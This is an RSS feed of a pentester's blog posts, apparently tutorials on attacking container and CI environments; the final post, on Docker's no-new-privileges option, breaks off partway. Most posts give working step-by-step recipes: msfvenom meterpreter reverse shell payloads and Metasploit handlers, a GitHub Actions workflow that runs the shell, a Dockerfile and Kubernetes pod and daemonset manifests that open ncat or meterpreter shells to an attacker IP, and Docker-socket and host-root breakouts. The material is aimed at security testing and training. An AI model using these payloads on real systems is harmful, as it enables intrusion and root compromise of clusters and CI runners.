<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Kubernetes Security Lab with Kind and Ansible</title>
				<description>&lt;p&gt;Being able to practice exploits and attacks is always useful for security testers, whether it’s working out whether a tool is working properly, or fine-tuning the synatax for a command in a predictable environment, it’s a very handy technique.  One factor that can slow this down is having to rely on external resources, like Virtual Machines or cloud based resources, for running our tests.  Ideally we should be able to run everything locally on a single machine.&lt;/p&gt;

&lt;p&gt;In the past I’ve looked at using &lt;a href=&quot;https://kind.sigs.k8s.io&quot;&gt;kind&lt;/a&gt; for this (with &lt;a href=&quot;https://raesene.github.io/blog/2019/03/04/kind-of-insecure-test-clusters/&quot;&gt;kind of insecure&lt;/a&gt;).  This works pretty well, but there are some limitations on what we can do in terms of setting up vulnerable environments with just kind on it’s own.&lt;/p&gt;

&lt;p&gt;Adding a configuration management tool to the mix can let us easily create more complex test environments.  Enter &lt;a href=&quot;https://www.ansible.com/&quot;&gt;Ansible&lt;/a&gt; which works pretty well for this application. It doesn’t require any server infrastructure, which is good for this kind of setup, and it’s possible to define a Docker container as the host for applying the actions to via a playbook.&lt;/p&gt;

&lt;h2 id=&quot;kube-security-lab&quot;&gt;Kube Security Lab&lt;/h2&gt;

&lt;p&gt;So I’ve started off the process of creating a set of vulnerable clusters as Ansible playbooks and put it &lt;a href=&quot;https://github.com/raesene/kube_security_lab&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The idea is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;client-machine.yml&lt;/code&gt; playbook can be used to spin up a container with client tools installed (it’s just an instance of &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;this image&lt;/a&gt; at the moment) and then bring up one or more of the vulnerable clusters as playbooks, practice attacking that configuration and then easily remove both the cluster and client container.&lt;/p&gt;

&lt;p&gt;In general you can spin up the client machine and a sample cluster, then port-scan the target cluster to see what’s exposed and start attacking things!&lt;/p&gt;

&lt;p&gt;There’s a starter set of playbooks up now, and I’ll plan to expand this as I get more ideas.  Also there should be walkthroughs for each of the clusters, in case people want the cheat sheet version :)&lt;/p&gt;

</description>
				<pubDate>Sat, 14 Sep 2019 17:10:39 +0100</pubDate>
				<link>/blog/2019/09/14/kube-security-lab/</link>
				<guid isPermaLink="true">/blog/2019/09/14/kube-security-lab/</guid>
			</item>
		
			<item>
				<title>Shells in Github Actions</title>
				<description>&lt;p&gt;I recently got my beta invite to the awesome &lt;a href=&quot;https://github.com/features/actions&quot;&gt;Github Actions&lt;/a&gt; feature.  This is a free to use CI/CD system.  If you’re not familiar with CI/CD, you can think of it as a system which runs a series of actions during your development process to help test/maintain/deploy it.  For example you could use CI to run your test suite on every commit, so you know if someone just broke the build.&lt;/p&gt;

&lt;p&gt;To do this we use “runners” which are essentially execution environments (e.g. a Virtual Machine) that runs our tests or other actions.&lt;/p&gt;

&lt;p&gt;Of course what do pentesters think, seeing the idea that someone’s going to let me execute commands somewhere… “hey can I get a shell on that?” :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/antitree/status/1164193020612423680?s=20&quot;&gt;Antitree got there first on twitter&lt;/a&gt; but I thought it could be fun to walk through the process in a little more detail than twitter’s format allows.&lt;/p&gt;

&lt;p&gt;The pre-requisite for this is that your Github account has actions enabled.  Once you’ve got that here’s a set of steps to get a shell on one of Github’s runners.&lt;/p&gt;

&lt;p&gt;It’s worth noting that what we’re detailing below isn’t likely any kind of security issue for Github, I’d expect that they’re providing dedicated ephemeral instances as CI runners, so you’re not likely to get access to anyone else’s infrastructure using this technique, it’s just a bit of fun :)&lt;/p&gt;

&lt;p&gt;One thing to note though in general for CI/CD environments is how important isolation is, if you’re running untrusted code in pipelines.  As we’ll show here, it’s pretty easy to get a shell back out of a runner, so don’t run these in a network with other important hosts…&lt;/p&gt;

&lt;h3 id=&quot;prepare-the-payload&quot;&gt;Prepare the payload&lt;/h3&gt;

&lt;p&gt;Just like in the previous post on &lt;a href=&quot;https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/&quot;&gt;Kubernetes shells&lt;/a&gt; we’re going to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;just replace &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;

&lt;p&gt;Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.&lt;/p&gt;

&lt;h3 id=&quot;our-gtihub-action&quot;&gt;Our Gtihub Action&lt;/h3&gt;

&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell

on: [push]

jobs:

  build:
 
    runs-on: ubuntu-latest
 
    steps:
    - uses: actions/checkout@v1
    - name: metasploit reverse shell
      run: ./reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now when we commit our repository, Github should run our action.  Before we do that make sure to set-up Metasploit to receive the connection.&lt;/p&gt;

&lt;h3 id=&quot;metasploit-handler&quot;&gt;Metasploit handler&lt;/h3&gt;

&lt;p&gt;after running &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)&lt;/p&gt;

&lt;h3 id=&quot;looking-around-a-github-runner&quot;&gt;Looking around a Github runner&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shell what can you see? Well it’s running an Ubuntu based distro, as we’d expect (it is possible to get Windows or indeed Mac runners, so you could repeat this exercise with them)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;“Privesc”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Listening ports&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The port &lt;code class=&quot;highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Routing Table&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
168.63.129.16   10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
169.254.169.254 10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Running Processes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;One thing I thought was interesting, although not really surprising, is that there are quite a few dotnet core processes running on the host.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Users on the host&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A quick look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
runner:x:1001:115:,,,:/home/runner:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This is just a quick exploration of a Github Actions runner host, showing some of the techniques that can be used to get shells in CI systems, if you have the ability to submit commands to them.&lt;/p&gt;

&lt;p&gt;Overall Github actions looks really cool, and I’m looking forward to integrating it into a lot of my repo’s alongside their private repository feature.&lt;/p&gt;
</description>
				<pubDate>Sun, 25 Aug 2019 13:10:39 +0100</pubDate>
				<link>/blog/2019/08/25/shells-in-gh-actions/</link>
				<guid isPermaLink="true">/blog/2019/08/25/shells-in-gh-actions/</guid>
			</item>
		
			<item>
				<title>Making it Rain shells in Kubernetes</title>
				<description>&lt;p&gt;Following on from the &lt;a href=&quot;https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/&quot;&gt;last post&lt;/a&gt; in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.&lt;/p&gt;

&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;

&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-1-create-the-payload&quot;&gt;Step 1: Create the payload&lt;/h2&gt;

&lt;p&gt;We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.&lt;/p&gt;

&lt;p&gt;For this we can run msfvenom to setup our payload and then embed that into a Docker image.&lt;/p&gt;

&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;

&lt;p&gt;This command will generate our payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;setting-up-the-docker-image&quot;&gt;Setting up the Docker Image&lt;/h3&gt;

&lt;p&gt;Next run this command to get the Docker GPG key into your directory&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y apt-transport-https ca-certificates curl software-properties-common

COPY docker.gpg /docker.gpg

RUN apt-key add /docker.gpg

RUN add-apt-repository \
   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable&quot;

RUN apt-get install -y docker-ce-cli

COPY reverse_shell.elf /reverse_shell.elf

RUN chmod +x /reverse_shell.elf

CMD [&quot;/reverse_shell.elf&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Build it with (replace raesene below with your own docker hub name)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.&lt;/p&gt;

&lt;h2 id=&quot;step-2-setting-up-metasploit-to-receive-our-shells&quot;&gt;Step 2: Setting up Metasploit to receive our shells&lt;/h2&gt;

&lt;p&gt;On the pentester machine start-up the metasploit console with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
set LHOST 192.168.200.1
set LPORT 8989
set ExitOnSession false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With those set, we can start it up to listen for incoming shells&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now on a target machine run our shell and we should get that back on the metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster&lt;/p&gt;

&lt;h2 id=&quot;step-3-using-a-daemonset-to-compromise-a-cluster&quot;&gt;Step 3: Using a Daemonset to compromise a cluster&lt;/h2&gt;

&lt;p&gt;So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.&lt;/p&gt;

&lt;p&gt;This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.&lt;/p&gt;

&lt;p&gt;We’ll call our manifest &lt;code class=&quot;highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: reverse-shell-daemonset
  labels:
spec:
  selector:
    matchLabels:
      name: reverse-shell-daemonset
  template:
    metadata:
      labels:
        name: reverse-shell-daemonset
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      containers:
      - name: revshell
        image: raesene/reverse-shell
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: dockersock
      volumes:
      - name: dockersock
        hostPath:
          path: /var/run/docker.sock
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got your manifest ready, just apply it to the cluster with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Back on your metasploit console you should see your shells pop in, one for each node :)&lt;/p&gt;

&lt;h3 id=&quot;getting-to-root-on-the-nodes&quot;&gt;Getting to root on the nodes&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shells working, you can interact with them from the Metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will show you your active sessions.  Then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will let you interact with one of them&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.&lt;/p&gt;

&lt;p&gt;To Do this we can juse make use of the every handy &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;Most Pointless Docker Command Ever&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and it’ll dump us out to a root shell on the underlying node :)&lt;/p&gt;
</description>
				<pubDate>Sat, 10 Aug 2019 07:10:39 +0100</pubDate>
				<link>/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</link>
				<guid isPermaLink="true">/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</guid>
			</item>
		
			<item>
				<title>Docker and Kubernetes Reverse shells</title>
				<description>&lt;p&gt;A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.&lt;/p&gt;

&lt;p&gt;There’s a number of scenarios where this can apply to containerized environments, here’s a couple with the steps that could be used to setup a reverse shell using &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;ncat&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;

&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
Here we just need a Docker image that has ncat available. I’ve got one &lt;a href=&quot;https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat&quot;&gt;here&lt;/a&gt; on Docker hub.&lt;/p&gt;

&lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;

&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y nmap

RUN ncat 192.168.200.1 8989 -e /bin/sh

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;

&lt;p&gt;So say you’ve got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you’d like to get a shell inside the cluster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['192.168.200.1', '8989', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily&lt;/p&gt;
</description>
				<pubDate>Fri, 09 Aug 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/08/09/docker-reverse-shells/</link>
				<guid isPermaLink="true">/blog/2019/08/09/docker-reverse-shells/</guid>
			</item>
		
			<item>
				<title>Docker Capabilities and no-new-privileges</title>
				<description>&lt;p&gt;I’ve been looking for a way to explain an demonstrate the “no-new-privileges” option in Docker for a little while for my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/#mastering-container-security-14020&quot;&gt;training course&lt;/a&gt; and recently came up with a way that should work, so thought it was worth a blog post.&lt;/p&gt;

&lt;h2 id=&quot;capabilities-and-docker&quot;&gt;Capabilities and Docker&lt;/h2&gt;

&lt;p&gt;First a little background.  Docker makes use of &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;capabilities&lt;/a&gt; as one of the layers of security that it applies to all new containers. Capabilities are essentially pieces of the privileges that the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user gets on a Linux system.  They enable processes to perform some privileged operations without having the full power of that user, and are very useful to get away from the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; binaries. Docker applies a restriction that when a new container is started, even if the root user is used, it won’t get all the capabilities of root, just a subset.&lt;/p&gt;

&lt;p&gt;An important point to note is that, if your process doesn’t need any “root-like” privileges, it shouldn’t need any capabilities, and processes started by ordinary users don’t generally get granted any capabilities.&lt;/p&gt;

&lt;p&gt;For more details on Docker and capabilities there’s a post &lt;a href=&quot;https://raesene.github.io/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/&quot;&gt;here&lt;/a&gt; that goes into some more depth on the topic.&lt;/p&gt;

&lt;h2 id=&quot;no-new-privileges&quot;&gt;no-new-privileges&lt;/h2&gt;

&lt;p&gt;So where does no-new-privileges come into all this?  Well this is an option that can be passed as part of a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; statement as a security option.  The Docker documentation on it says you can use it&lt;/p&gt;
